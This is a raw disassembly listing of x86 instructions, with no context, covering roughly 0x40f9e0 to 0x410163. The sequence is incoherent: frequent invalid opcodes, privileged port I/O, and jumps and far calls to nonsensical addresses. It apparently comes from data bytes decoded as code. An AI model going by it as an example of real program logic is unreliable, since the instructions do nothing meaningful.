  40f9e0:	mov    cl,0x58
  40f9e2:	xchg   BYTE PTR [ebx-0x7],bl
  40f9e5:	aas    
  40f9e6:	pop    edx
  40f9e7:	mov    dl,0x1f
  40f9e9:	add    eax,0xc039e08e
  40f9ee:	in     al,0x4c
  40f9f0:	add    DWORD PTR [edx+edi*4],ebx
  40f9f3:	push   ebx
  40f9f4:	dec    ebp
  40f9f5:	dec    esi
  40f9f6:	mov    ebp,0xf2e127ab
  40f9fb:	lea    ebp,[esi]
  40f9fd:	mov    ebx,0xc7e84033
  40fa03:	cmp    DWORD PTR [edx+0x0],eax
  40fa06:	push   ebp
  40fa07:	sbb    bh,ah
  40fa09:	and    eax,DWORD PTR [eax-0x7d]
  40fa0c:	fucomp st(2)
  40fa0e:	xchg   esi,eax
  40fa0f:	test   eax,0xbf5ca346
  40fa14:	xor    DWORD PTR [edi+0x1c],edi
  40fa17:	gs ret 0xe139
  40fa1b:	popf   
  40fa1c:	(bad)  
  40fa1d:	enter  0x3e09,0x7e
  40fa21:	dec    eax
  40fa22:	fdivp  st(4),st
  40fa24:	mov    ebp,0xc4a54dee
  40fa29:	mov    edx,0x326bda50
  40fa2e:	dec    DWORD PTR [ecx+0x5c7ff4e0]
  40fa34:	fldenv ds:0x56ca4b68
  40fa3a:	leave  
  40fa3b:	clc    
  40fa3c:	xor    al,0x20
  40fa3e:	or     al,0xfe
  40fa40:	aas    
  40fa41:	and    bl,0x57
  40fa44:	loop   0x40fa30
  40fa46:	loopne 0x40fab9
  40fa48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa49:	add    cl,BYTE PTR [edx+0x7f]
  40fa4c:	jg     0x40f9f4
  40fa4e:	xor    DWORD PTR [esi-0x1b7551d0],ebx
  40fa54:	jb     0x40fa45
  40fa56:	push   esp
  40fa57:	outs   dx,DWORD PTR ds:[esi]
  40fa58:	lahf   
  40fa59:	and    al,0x1f
  40fa5b:	test   al,0x91
  40fa5d:	inc    ecx
  40fa5e:	jle    0x40facb
  40fa60:	nop
  40fa61:	into   
  40fa62:	ja     0x40fa7b
  40fa64:	sub    BYTE PTR [eax-0x563c04ab],ch
  40fa6a:	xchg   edx,eax
  40fa6b:	push   edi
  40fa6c:	pushf  
  40fa6d:	popf   
  40fa6e:	in     eax,0x68
  40fa70:	les    eax,FWORD PTR [ecx-0x6fe1d76f]
  40fa76:	out    dx,al
  40fa77:	clc    
  40fa78:	jb     0x40fa37
  40fa7a:	push   edi
  40fa7b:	arpl   WORD PTR [ecx],ax
  40fa7d:	mov    WORD PTR [ebx+0x7a],?
  40fa80:	dec    edx
  40fa81:	and    dl,BYTE PTR [esi-0x2e0f9f57]
  40fa87:	aas    
  40fa88:	jmp    0x2ea8663e
  40fa8d:	add    BYTE PTR [ebx+0x3d],al
  40fa90:	xlat   BYTE PTR ds:[ebx]
  40fa91:	jns    0x40fa5a
  40fa93:	fwait
  40fa94:	loop   0x40fadb
  40fa96:	and    BYTE PTR [bx],ch
  40fa99:	inc    ebp
  40fa9a:	fisttp WORD PTR [edi]
  40fa9c:	icebp  
  40fa9d:	pop    edi
  40fa9e:	sub    BYTE PTR [eax+0xe538423],al
  40faa4:	sar    DWORD PTR [edi-0x7],cl
  40faa7:	sbb    edi,esp
  40faa9:	pop    esp
  40faaa:	out    0x35,eax
  40faac:	sub    BYTE PTR [edx],0x55
  40faaf:	hlt    
  40fab0:	mov    dl,0xea
  40fab2:	clc    
  40fab3:	das    
  40fab4:	jnp    0x40fa80
  40fab6:	aad    0x92
  40fab8:	jno    0x40fa3a
  40faba:	popa   
  40fabb:	or     BYTE PTR [ebx-0x3a],0x83
  40fabf:	daa    
  40fac0:	call   DWORD PTR [edx+edi*2+0x4c]
  40fac4:	hlt    
  40fac5:	push   ss
  40fac6:	in     al,0x8c
  40fac8:	fisub  DWORD PTR [esi]
  40faca:	sbb    edx,DWORD PTR [edi+ebp*8]
  40facd:	retf   0x8f5b
  40fad0:	shl    DWORD PTR [ecx-0x6046b639],0x73
  40fad7:	mov    DWORD PTR [edi-0x74],edi
  40fada:	mov    bl,0x86
  40fadc:	call   0x762df692
  40fae1:	mov    ds:0x2b0b8cb1,al
  40fae6:	cmc    
  40fae7:	(bad)  
  40fae8:	retf   
  40fae9:	lods   eax,DWORD PTR ds:[esi]
  40faea:	sti    
  40faeb:	cmc    
  40faec:	lods   al,BYTE PTR ds:[esi]
  40faed:	aas    
  40faee:	ins    DWORD PTR es:[edi],dx
  40faef:	mov    ecx,0xfb5f1a2c
  40faf4:	rcr    DWORD PTR [ebx],0x1c
  40faf7:	mov    al,ds:0xcbb38494
  40fafc:	sbb    al,0x75
  40fafe:	iret   
  40faff:	bound  ebp,QWORD PTR [ebp-0x76]
  40fb02:	fs inc edi
  40fb04:	mov    eax,0x535cb291
  40fb09:	jmp    0xc5950376
  40fb0e:	dec    esi
  40fb0f:	ja     0x40fac4
  40fb11:	mov    edi,0x5fc38976
  40fb16:	dec    eax
  40fb17:	enter  0xfa6d,0x7b
  40fb1b:	mov    dh,0x73
  40fb1d:	fdivrp st(0),st
  40fb1f:	jl     0x40fb35
  40fb21:	test   DWORD PTR [ecx],edi
  40fb23:	pop    esi
  40fb24:	int    0x93
  40fb26:	dec    ecx
  40fb27:	fcmovb st,st(0)
  40fb29:	(bad)  
  40fb2a:	mov    ebp,0x7d1b2900
  40fb2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb30:	aam    0x9f
  40fb32:	xchg   edx,eax
  40fb33:	sti    
  40fb34:	sti    
  40fb35:	xor    dh,cl
  40fb37:	mov    ss:0x474eeb67,eax
  40fb3d:	and    DWORD PTR [ebx+0x3ee5ef4c],ebp
  40fb43:	sub    BYTE PTR [ebp-0x75253977],dh
  40fb49:	das    
  40fb4a:	leave  
  40fb4b:	sub    DWORD PTR [edi+0x3b045499],0xffffff99
  40fb52:	int    0x8c
  40fb54:	add    eax,0xe53277a4
  40fb59:	icebp  
  40fb5a:	shl    DWORD PTR [ecx+0x4a],1
  40fb5d:	dec    ebx
  40fb5e:	xor    al,0xb8
  40fb60:	jge    0x40faf9
  40fb62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb63:	or     eax,0x5db9b399
  40fb68:	out    dx,al
  40fb69:	jnp    0x40fb23
  40fb6b:	call   0xfa86564a
  40fb70:	cmp    BYTE PTR [edx+eiz*4+0x9ec8a08],ah
  40fb77:	sub    eax,0x43dd4c36
  40fb7c:	not    DWORD PTR [edx-0xd10aaa7]
  40fb82:	call   0x4078:0x61028c0f
  40fb89:	stos   BYTE PTR es:[edi],al
  40fb8a:	xor    ebp,0x4c
  40fb8d:	outs   dx,BYTE PTR ds:[esi]
  40fb8e:	or     DWORD PTR [edx+0x2a211817],0xfa84fb63
  40fb98:	rcl    DWORD PTR [esi+0x1fead530],1
  40fb9e:	cli    
  40fb9f:	sbb    ebx,DWORD PTR [edx-0x21]
  40fba2:	sub    eax,0x795f8453
  40fba7:	push   0xfffffff4
  40fba9:	sub    ah,BYTE PTR [edx]
  40fbab:	ret    0x3db4
  40fbae:	dec    ecx
  40fbaf:	jg     0x40fb9d
  40fbb1:	rol    BYTE PTR ds:0x8bfd41f8,0xf5
  40fbb8:	lods   eax,DWORD PTR ds:[esi]
  40fbb9:	bound  edx,QWORD PTR [edx+0x2c1203e8]
  40fbbf:	mov    eax,0xbb51d8d0
  40fbc4:	xchg   BYTE PTR [esi+0x27],dh
  40fbc7:	lahf   
  40fbc8:	add    al,0x4a
  40fbca:	pop    esp
  40fbcb:	es mov edi,ebp
  40fbce:	shr    bl,0x82
  40fbd1:	mov    bl,0x3d
  40fbd3:	lods   eax,DWORD PTR ds:[esi]
  40fbd4:	xchg   ch,cl
  40fbd6:	adc    edx,eax
  40fbd8:	inc    eax
  40fbd9:	mov    eax,0x28b94f6d
  40fbde:	lock sahf 
  40fbe0:	dec    eax
  40fbe1:	lods   al,BYTE PTR ds:[esi]
  40fbe2:	inc    BYTE PTR [edi-0x11]
  40fbe5:	aam    0xb7
  40fbe7:	std    
  40fbe8:	out    dx,eax
  40fbe9:	or     BYTE PTR [ebx+0x72],dh
  40fbec:	and    esp,ebp
  40fbee:	test   eax,0x7839adb
  40fbf3:	addr16 dec eax
  40fbf5:	das    
  40fbf6:	shl    BYTE PTR [edx-0x3f],0x94
  40fbfa:	mov    al,ds:0x701b2fd8
  40fbff:	inc    esi
  40fc00:	js     0x40fbc8
  40fc02:	inc    esp
  40fc03:	xor    BYTE PTR [ebp+0x55f633a4],bl
  40fc09:	pop    es
  40fc0a:	mov    eax,ds:0xf7a80331
  40fc0f:	cli    
  40fc10:	xor    esi,DWORD PTR [esi+esi*2-0x4a5e0d6a]
  40fc17:	add    BYTE PTR [edi-0x6e],dh
  40fc1a:	test   DWORD PTR [esp+ecx*8],ebp
  40fc1d:	dec    edi
  40fc1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc1f:	mov    bl,0x6c
  40fc21:	jno    0x40fc36
  40fc23:	cmp    eax,0xd47bed
  40fc28:	or     al,0xc2
  40fc2a:	(bad)  
  40fc2c:	in     al,0x76
  40fc2e:	push   ebx
  40fc2f:	adc    ch,ch
  40fc31:	stos   DWORD PTR es:[edi],eax
  40fc32:	sbb    eax,0xdeebda82
  40fc37:	in     al,0xc1
  40fc39:	and    al,0x47
  40fc3b:	or     al,0x3b
  40fc3e:	mov    bl,0xaf
  40fc40:	add    eax,0xc103c03c
  40fc45:	rcl    ch,1
  40fc47:	fmul   st,st(5)
  40fc49:	mov    BYTE PTR [ebx+0x32],dh
  40fc4c:	mov    esp,0x1dccb290
  40fc51:	sub    DWORD PTR [eax-0x38886980],esi
  40fc57:	fsubr  DWORD PTR [esi]
  40fc59:	pop    esp
  40fc5a:	cli    
  40fc5b:	(bad)  
  40fc5d:	(bad)  
  40fc5e:	fsubr  DWORD PTR ds:0x55870228
  40fc64:	inc    esp
  40fc65:	mov    eax,0x4bde2dc2
  40fc6a:	sbb    al,0x36
  40fc6c:	sub    eax,0x9d5af5ab
  40fc71:	push   cs
  40fc72:	lods   al,BYTE PTR ds:[esi]
  40fc73:	lea    esi,[ecx]
  40fc75:	mov    al,0x62
  40fc77:	mov    bh,0x12
  40fc79:	add    al,0xa5
  40fc7b:	loope  0x40fc96
  40fc7d:	arpl   si,si
  40fc7f:	aam    0x84
  40fc81:	loop   0x40fc7a
  40fc83:	ret    0xfbd0
  40fc86:	xchg   ebx,eax
  40fc87:	(bad)  
  40fc88:	mov    eax,0xa6f1ee0e
  40fc8d:	pop    ebx
  40fc8e:	aam    0xbc
  40fc90:	leave  
  40fc91:	sahf   
  40fc92:	(bad)  
  40fc93:	sbb    al,0xcb
  40fc95:	add    al,0xd7
  40fc97:	addr16 or dh,dh
  40fc9a:	xor    eax,0x67e307c8
  40fc9f:	(bad)  
  40fca0:	je     0x40fc2d
  40fca2:	out    dx,al
  40fca3:	and    BYTE PTR [edi-0x18885ced],bh
  40fca9:	mov    fs,WORD PTR [ebp-0x2e249975]
  40fcaf:	les    edi,FWORD PTR [edx+0x4facf160]
  40fcb5:	cmp    al,0xb1
  40fcb7:	and    ebx,esp
  40fcb9:	in     eax,dx
  40fcba:	es aaa 
  40fcbc:	sub    DWORD PTR [esp+eax*1-0x175694b6],ebx
  40fcc3:	fldcw  WORD PTR [edx+0x1d903be5]
  40fcc9:	jne    0x40fc75
  40fccb:	cmp    eax,0xcbe76bdd
  40fcd0:	sub    ch,BYTE PTR [ecx-0x1]
  40fcd3:	inc    edi
  40fcd4:	jne    0x40fcf0
  40fcd6:	push   ebp
  40fcd7:	push   ecx
  40fcd8:	js     0x40fd44
  40fcda:	js     0x40fcc5
  40fcdc:	jmp    0x40fd01
  40fcde:	retf   0x8980
  40fce1:	icebp  
  40fce2:	in     eax,0x5e
  40fce4:	mov    ch,0x65
  40fce6:	je     0x40fcef
  40fce8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fce9:	fiadd  DWORD PTR [ebx]
  40fceb:	iret   
  40fcec:	int    0x24
  40fcee:	cmp    BYTE PTR [edx],0xb8
  40fcf1:	jmp    0x653:0x93a2d6e8
  40fcf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcf9:	jge    0x40fd1d
  40fcfb:	sbb    bl,BYTE PTR [esi-0x7d566646]
  40fd01:	cdq    
  40fd02:	pushf  
  40fd03:	test   DWORD PTR [esi],ebx
  40fd05:	sub    al,0x2e
  40fd07:	sbb    bh,BYTE PTR [eax]
  40fd09:	cld    
  40fd0a:	shl    DWORD PTR [esi+ecx*2+0x59],1
  40fd0e:	es xchg ecx,eax
  40fd10:	out    0x4c,eax
  40fd12:	mov    ah,0xec
  40fd14:	loopne 0x40fc9f
  40fd16:	mov    eax,0x393fc05b
  40fd1b:	stc    
  40fd1c:	mov    al,ds:0x8eb0cb65
  40fd21:	lahf   
  40fd22:	sbb    al,ch
  40fd24:	xor    eax,0x7d75eadf
  40fd29:	loop   0x40fd5e
  40fd2b:	or     BYTE PTR fs:[ecx],bl
  40fd2e:	popa   
  40fd2f:	loope  0x40fcfe
  40fd31:	out    0xdb,al
  40fd33:	dec    ecx
  40fd34:	aam    0xf5
  40fd36:	stc    
  40fd37:	ss push 0x12301bf2
  40fd3d:	pop    ss
  40fd3e:	out    dx,eax
  40fd3f:	dec    ebp
  40fd40:	stc    
  40fd41:	sti    
  40fd42:	add    edx,DWORD PTR [edi+0xcd1ed50]
  40fd48:	add    ebp,ebx
  40fd4a:	aas    
  40fd4b:	cdq    
  40fd4c:	dec    esp
  40fd4d:	cmp    eax,0xdaa6efa7
  40fd52:	into   
  40fd53:	and    ch,al
  40fd55:	ret    0xfa4
  40fd58:	jle    0x40fdae
  40fd5a:	xchg   DWORD PTR [ecx+0x7c],ecx
  40fd5d:	repnz mov edx,0x74452a
  40fd63:	pop    ebx
  40fd64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd65:	add    DWORD PTR [edi-0x27303dcf],esi
  40fd6b:	dec    esp
  40fd6c:	retf   
  40fd6d:	jl     0x40fd65
  40fd6f:	mov    esp,ebp
  40fd71:	fwait
  40fd72:	inc    eax
  40fd73:	push   cs
  40fd74:	inc    ecx
  40fd75:	es push 0x21
  40fd78:	aas    
  40fd79:	fs aaa 
  40fd7b:	test   dh,0xde
  40fd7e:	clc    
  40fd7f:	imul   esi,esi,0xfffffffa
  40fd82:	jmp    0xe1864069
  40fd87:	addr16 cmp eax,0x2de09c7e
  40fd8d:	popf   
  40fd8e:	jle    0x40fdf2
  40fd90:	fbld   TBYTE PTR [edx]
  40fd92:	loop   0x40fd25
  40fd94:	fldenv [edx+0x59498cef]
  40fd9a:	outs   dx,DWORD PTR ds:[esi]
  40fd9b:	mov    ebx,DWORD PTR [edx+0x279e4764]
  40fda1:	repz sub dl,bl
  40fda4:	into   
  40fda5:	cmp    al,0x3c
  40fda7:	aam    0xd6
  40fda9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdaa:	add    bh,dl
  40fdac:	ror    DWORD PTR [ebx],1
  40fdae:	lea    ecx,ds:0xd2731eba
  40fdb4:	dec    ebx
  40fdb5:	push   eax
  40fdb6:	push   ecx
  40fdb7:	adc    eax,DWORD PTR [eax+0x4c726a13]
  40fdbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fdbe:	sub    eax,0x1aefc296
  40fdc3:	pop    es
  40fdc4:	jle    0x40fd52
  40fdc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdc7:	lock inc edi
  40fdc9:	ds xchg dh,bl
  40fdcc:	lea    eax,[ebx+0x1609021d]
  40fdd2:	stos   BYTE PTR es:[edi],al
  40fdd3:	inc    esi
  40fdd4:	out    0x12,al
  40fdd6:	ror    BYTE PTR [edx+0x15c007fd],0x27
  40fddd:	xchg   BYTE PTR [edx],bh
  40fddf:	adc    edx,ecx
  40fde1:	pop    edx
  40fde2:	xchg   edi,eax
  40fde3:	mul    DWORD PTR [eax-0x5e7c6340]
  40fde9:	or     eax,DWORD PTR [ebp-0x22]
  40fdec:	sbb    al,0x92
  40fdee:	pop    ecx
  40fdef:	sbb    ch,al
  40fdf1:	daa    
  40fdf2:	push   es
  40fdf3:	mov    cl,0x35
  40fdf5:	mov    edx,0x83705b66
  40fdfa:	inc    ebx
  40fdfb:	mov    ecx,0x94866b61
  40fe00:	std    
  40fe01:	sub    al,0xbc
  40fe03:	xchg   ebp,eax
  40fe04:	icebp  
  40fe05:	cmp    DWORD PTR [edi+0x3c],ebp
  40fe08:	push   0x3e52b7f0
  40fe0d:	sahf   
  40fe0e:	ret    
  40fe0f:	adc    BYTE PTR [ebp+0x48],bl
  40fe12:	call   0x7942edbf
  40fe17:	test   eax,0x43be100
  40fe1c:	js     0x40fe1f
  40fe1e:	test   eax,0x170d58b1
  40fe23:	jp     0x40fe9d
  40fe25:	inc    esp
  40fe26:	test   eax,0xfd6b1f43
  40fe2b:	sar    BYTE PTR [ebx+0x5795301c],1
  40fe31:	jp     0x40fea8
  40fe33:	jo     0x40fea0
  40fe35:	pop    ecx
  40fe36:	pop    ebx
  40fe37:	aam    0x1
  40fe39:	or     eax,0x5b1fd134
  40fe3e:	add    ecx,DWORD PTR [ebx]
  40fe40:	add    BYTE PTR [ebx],cl
  40fe42:	(bad)  
  40fe43:	pop    ecx
  40fe44:	mov    BYTE PTR [ebx-0x65aeda39],cl
  40fe4a:	adc    BYTE PTR [esi-0x1c],dh
  40fe4d:	add    bl,BYTE PTR [edi]
  40fe4f:	pop    esp
  40fe50:	mov    esp,0xed95c876
  40fe55:	rol    BYTE PTR [ecx+0x61095b96],0xcb
  40fe5c:	test   BYTE PTR ds:0xd933a9e2,bl
  40fe62:	mov    cl,0x8e
  40fe64:	sub    DWORD PTR [esi+0x0],eax
  40fe67:	cmp    BYTE PTR [edx+0xe],bl
  40fe6a:	mov    eax,ds:0xf06741
  40fe6f:	inc    ebx
  40fe70:	xchg   edi,eax
  40fe71:	test   DWORD PTR [edx-0x3799e123],ecx
  40fe77:	fwait
  40fe78:	xchg   ebx,eax
  40fe79:	imul   ebp,DWORD PTR [esi],0x77
  40fe7c:	pop    ecx
  40fe7d:	jmp    0x40fe5a
  40fe7f:	pop    esp
  40fe80:	sub    BYTE PTR [esi-0x5e209eca],dl
  40fe86:	outs   dx,DWORD PTR ds:[esi]
  40fe87:	add    al,0x3
  40fe89:	iret   
  40fe8a:	jno    0x40fe11
  40fe8c:	cdq    
  40fe8d:	pop    edi
  40fe8e:	rcr    DWORD PTR [ebp+0x8],1
  40fe91:	retf   
  40fe92:	push   0x3a066840
  40fe97:	pop    ds
  40fe98:	dec    DWORD PTR [ebx-0x57]
  40fe9b:	std    
  40fe9c:	js     0x40ff1a
  40fe9e:	ret    
  40fe9f:	std    
  40fea0:	leave  
  40fea1:	js     0x40fe5e
  40fea3:	push   cs
  40fea4:	mov    ebx,0x5dab02e5
  40fea9:	push   eax
  40feaa:	dec    edx
  40feab:	(bad)  
  40feac:	cmp    eax,0x17da7dd7
  40feb1:	call   0x2c566023
  40feb6:	fisttp WORD PTR [edi-0x56]
  40feb9:	add    eax,DWORD PTR [ebx+0x74]
  40febc:	add    eax,0x7b514a42
  40fec1:	jg     0x40ff07
  40fec3:	inc    edx
  40fec4:	in     al,dx
  40fec5:	jg     0x40ff01
  40fec7:	sub    BYTE PTR [esi],0x10
  40feca:	push   es
  40fecb:	jno    0x40fed9
  40fecd:	mov    eax,DWORD PTR [ebx+edx*2-0x1149cdd9]
  40fed4:	stos   DWORD PTR es:[edi],eax
  40fed5:	(bad)  
  40fed6:	jl     0x40fe58
  40fed8:	mov    al,0xe0
  40feda:	js     0x40fed2
  40fedc:	pop    esp
  40fedd:	cmovbe esp,DWORD PTR [ebx+0x69]
  40fee1:	fmul   st(5),st
  40fee3:	push   0xdf07f8cb
  40fee8:	jge    0x40fea4
  40feea:	stc    
  40feeb:	jl     0x40ff01
  40feed:	sahf   
  40feee:	das    
  40feef:	(bad)  
  40fef0:	enter  0xa574,0x59
  40fef4:	inc    ebx
  40fef5:	popa   
  40fef6:	push   cs
  40fef7:	mov    cl,0xee
  40fef9:	loopne 0x40ff26
  40fefb:	sar    eax,0x22
  40fefe:	dec    DWORD PTR [ebp+edi*8+0x51]
  40ff02:	cmp    ebx,DWORD PTR [edi+0x63c1e1f4]
  40ff08:	cmp    BYTE PTR [edi],0x6c
  40ff0b:	and    bh,BYTE PTR [edx+eiz*4]
  40ff0e:	(bad)  
  40ff0f:	pop    esi
  40ff10:	pop    ds
  40ff11:	and    dl,BYTE PTR [ebx+0x76]
  40ff14:	adc    BYTE PTR ds:0xbfce21f,dh
  40ff1a:	fimul  DWORD PTR [eax+0x22]
  40ff1d:	sti    
  40ff1e:	je     0x40feea
  40ff20:	stc    
  40ff21:	push   cs
  40ff22:	cmp    DWORD PTR [ecx],esi
  40ff24:	je     0x40fea7
  40ff26:	dec    eax
  40ff27:	jl     0x40ff5f
  40ff29:	push   es
  40ff2a:	cwde   
  40ff2b:	xor    DWORD PTR [ebx],edi
  40ff2d:	mov    dh,0x3a
  40ff2f:	xchg   esi,eax
  40ff30:	push   esp
  40ff31:	or     eax,0x69754b2e
  40ff36:	clc    
  40ff37:	scas   eax,DWORD PTR es:[edi]
  40ff38:	ret    0x2cef
  40ff3b:	imul   edx,DWORD PTR [ebx],0xc3d72623
  40ff41:	pop    esp
  40ff42:	fistp  WORD PTR [edi+0x7d]
  40ff45:	outs   dx,BYTE PTR ds:[esi]
  40ff46:	scas   eax,DWORD PTR es:[edi]
  40ff47:	xor    al,BYTE PTR [eax-0xe852e2f]
  40ff4d:	cwde   
  40ff4e:	add    DWORD PTR [eax],edi
  40ff50:	fsub   DWORD PTR [ecx-0x4f]
  40ff53:	cmp    BYTE PTR [esi],0x21
  40ff56:	pop    ecx
  40ff57:	mov    edi,0xd1f0797f
  40ff5c:	sbb    al,BYTE PTR [esi]
  40ff5e:	lea    edx,[ebx-0x62]
  40ff61:	adc    esp,DWORD PTR [ebx]
  40ff63:	mov    DWORD PTR [ecx],edi
  40ff65:	xor    al,0x94
  40ff67:	and    esi,edx
  40ff69:	pop    ebp
  40ff6a:	sub    DWORD PTR [edx+ecx*4],ecx
  40ff6d:	sbb    al,0xad
  40ff6f:	gs mov ah,0x27
  40ff72:	xchg   edx,eax
  40ff73:	cmc    
  40ff74:	call   0x5339:0xfe94bf59
  40ff7b:	stos   BYTE PTR es:[edi],al
  40ff7c:	sub    BYTE PTR [ebp-0x6d],0x1d
  40ff80:	scas   eax,DWORD PTR es:[edi]
  40ff81:	(bad)  
  40ff82:	lock and eax,0x646281ff
  40ff88:	dec    edi
  40ff89:	sti    
  40ff8a:	jo     0x40ff77
  40ff8c:	pop    edi
  40ff8d:	popf   
  40ff8e:	leave  
  40ff8f:	loopne 0x40ffc4
  40ff91:	inc    ebx
  40ff92:	ds retf 0xd979
  40ff96:	jno    0x40ff97
  40ff98:	mov    edx,0x2d0fd434
  40ff9d:	pop    ecx
  40ff9e:	push   0xffffffcf
  40ffa0:	icebp  
  40ffa1:	push   ebx
  40ffa2:	arpl   WORD PTR [ecx+0x35],si
  40ffa5:	dec    DWORD PTR ds:0xa1cbff9d
  40ffab:	jmp    0x40ffdd
  40ffad:	mov    cl,0x67
  40ffaf:	mov    ch,0x27
  40ffb1:	rcl    BYTE PTR [edx],1
  40ffb3:	(bad)  
  40ffb4:	and    al,0xc5
  40ffb6:	les    edi,FWORD PTR [edx+eax*4+0x1]
  40ffba:	nop
  40ffbb:	lods   al,BYTE PTR ds:[esi]
  40ffbc:	loopne 0x40ffe3
  40ffbe:	adc    edi,0xffffffce
  40ffc1:	ss push esi
  40ffc3:	push   0x6a48a32b
  40ffc8:	out    dx,al
  40ffc9:	daa    
  40ffca:	stos   DWORD PTR es:[edi],eax
  40ffcb:	inc    ecx
  40ffcc:	dec    esi
  40ffcd:	retf   0x464a
  40ffd0:	ret    
  40ffd1:	addr16 out 0x72,eax
  40ffd4:	jmp    0x4e4c:0x1065cc89
  40ffdb:	pop    ebx
  40ffdc:	mov    eax,?
  40ffde:	fwait
  40ffdf:	jno    0x40ffca
  40ffe1:	pop    ds
  40ffe2:	in     eax,0xd5
  40ffe4:	stos   BYTE PTR es:[edi],al
  40ffe5:	mov    dh,0x82
  40ffe7:	sbb    esp,DWORD PTR [ecx-0x176446c7]
  40ffed:	fistp  DWORD PTR [edi-0x72bcbab]
  40fff3:	mov    eax,ds:0xfa405fd0
  40fff8:	inc    esp
  40fff9:	ss xchg ebx,eax
  40fffb:	das    
  40fffc:	and    BYTE PTR [esi-0x4c],ch
  40ffff:	dec    ebx
  410000:	xchg   edx,eax
  410001:	lock fnstsw WORD PTR ds:0xd4f0afa4
  410008:	mov    ds:0x51b4504e,al
  41000d:	dec    esp
  41000e:	call   0x2ec2:0x1a937ee2
  410015:	fidiv  DWORD PTR [esi+eax*1]
  410019:	in     al,0x1e
  41001b:	xor    BYTE PTR [ecx-0x55122f94],0x7c
  410022:	mov    edi,0xa120c35b
  410027:	cmp    DWORD PTR [ecx],esp
  410029:	mov    bh,0xb8
  41002b:	mov    DWORD PTR [edi+0x5e],ebx
  41002e:	xchg   DWORD PTR [esi-0x45f921a],edx
  410034:	mov    al,0x23
  410036:	sar    BYTE PTR [eax+0x299698ed],1
  41003c:	or     al,cl
  41003e:	mov    ebx,0x61391911
  410043:	ud0    ebx,DWORD PTR [ebp+0x39]
  410047:	lods   al,BYTE PTR ds:[esi]
  410048:	(bad)  
  41004a:	mov    esp,0x611b0bf
  41004f:	repnz xchg ebx,eax
  410051:	ins    DWORD PTR es:[edi],dx
  410052:	push   edx
  410053:	adc    BYTE PTR [edx+0x65],0x86
  410057:	nop
  410058:	inc    ebx
  410059:	ins    DWORD PTR es:[edi],dx
  41005a:	call   0x85e3a12c
  41005f:	fisttp QWORD PTR [edi]
  410061:	out    dx,al
  410062:	mov    esi,0x1f8635a4
  410067:	jg     0x410033
  410069:	inc    esi
  41006a:	daa    
  41006b:	hlt    
  41006c:	or     al,0x4e
  41006e:	bound  esp,QWORD PTR [eax-0x34]
  410071:	push   eax
  410072:	ret    
  410073:	sbb    eax,0xedbd5812
  410078:	lahf   
  410079:	adc    bh,BYTE PTR [ecx]
  41007b:	xchg   esp,eax
  41007c:	adc    al,0x20
  41007e:	jno    0x410069
  410080:	sub    BYTE PTR [esi],0x60
  410083:	out    dx,al
  410084:	loop   0x410043
  410086:	and    BYTE PTR ds:0x961416ab,ch
  41008c:	cmp    DWORD PTR [edi],esi
  41008e:	sbb    edx,DWORD PTR [edi+0x69]
  410091:	push   edx
  410092:	cli    
  410093:	xchg   ebx,eax
  410094:	mov    bh,0xde
  410096:	in     al,0x1f
  410098:	mov    cl,0xa
  41009a:	sub    BYTE PTR [edx],bl
  41009c:	or     ch,BYTE PTR [edx-0x7b7a31fc]
  4100a2:	in     al,dx
  4100a3:	xor    eax,0xef7dcf4c
  4100a8:	add    ch,BYTE PTR [edx]
  4100aa:	lds    esp,FWORD PTR [edx]
  4100ac:	push   cs
  4100ad:	jnp    0x410090
  4100af:	cli    
  4100b0:	ins    BYTE PTR es:[edi],dx
  4100b1:	retf   
  4100b2:	sar    edx,cl
  4100b4:	rcr    BYTE PTR [edi+0x10687768],cl
  4100ba:	dec    ecx
  4100bb:	push   esi
  4100bc:	sub    edx,DWORD PTR [edx-0x3f]
  4100bf:	xchg   edx,eax
  4100c0:	inc    eax
  4100c1:	and    DWORD PTR [edi],ebx
  4100c3:	fild   QWORD PTR [ebx-0x78]
  4100c6:	cmp    al,0x8a
  4100c8:	ins    DWORD PTR es:[edi],dx
  4100c9:	fucom  st(6)
  4100cb:	inc    esi
  4100cc:	adc    esp,DWORD PTR [ebp-0x6d8e64cd]
  4100d2:	test   eax,0xad1d1bdd
  4100d7:	xor    BYTE PTR [edx+edx*8-0x7f281df6],dh
  4100de:	daa    
  4100df:	call   0xf42fdfa3
  4100e4:	xor    al,BYTE PTR [ebp-0x316bd5cb]
  4100ea:	les    ebp,FWORD PTR ds:0x14f4df7
  4100f0:	mov    bh,bl
  4100f2:	pop    edi
  4100f3:	adc    BYTE PTR [eax-0x7b],dh
  4100f6:	popa   
  4100f7:	mov    esp,0x451db16e
  4100fc:	push   eax
  4100fd:	cmp    DWORD PTR [ebx+eiz*4-0x679bedbe],esp
  410104:	pop    ebp
  410105:	sbb    bl,0x40
  410108:	popa   
  410109:	xor    eax,0x2800a03
  41010f:	call   0xff36bac0
  410114:	mov    edi,0x9a58cee0
  410119:	int3   
  41011a:	int3   
  41011b:	dec    esp
  41011c:	rol    ah,cl
  41011e:	out    dx,al
  41011f:	sub    ah,al
  410121:	repnz cmp cl,BYTE PTR [ebp+ebp*2-0x6c60df77]
  410129:	scas   eax,DWORD PTR es:[edi]
  41012a:	mov    bl,0x50
  41012c:	mov    al,ds:0x5c438202
  410131:	(bad)  
  410132:	repnz push cs
  410134:	jle    0x410113
  410136:	lods   al,BYTE PTR ds:[esi]
  410137:	int    0xe5
  410139:	aam    0x57
  41013b:	clc    
  41013c:	pop    ss
  41013d:	push   ss
  41013e:	ins    DWORD PTR es:[edi],dx
  41013f:	jae    0x4101b8
  410141:	jno    0x4101c1
  410143:	ja     0x4100f6
  410145:	fdivp  st(1),st
  410147:	aaa    
  410148:	div    edi
  41014a:	adc    DWORD PTR [ebx+0x5dfc4e48],eax
  410150:	and    ebx,DWORD PTR [esi]
  410152:	(bad)
  410156:	ss and eax,0xc1160477
  41015c:	sbb    al,0x21
  41015e:	sbb    DWORD PTR cs:[edi+0x5b953968],0xffffffa5
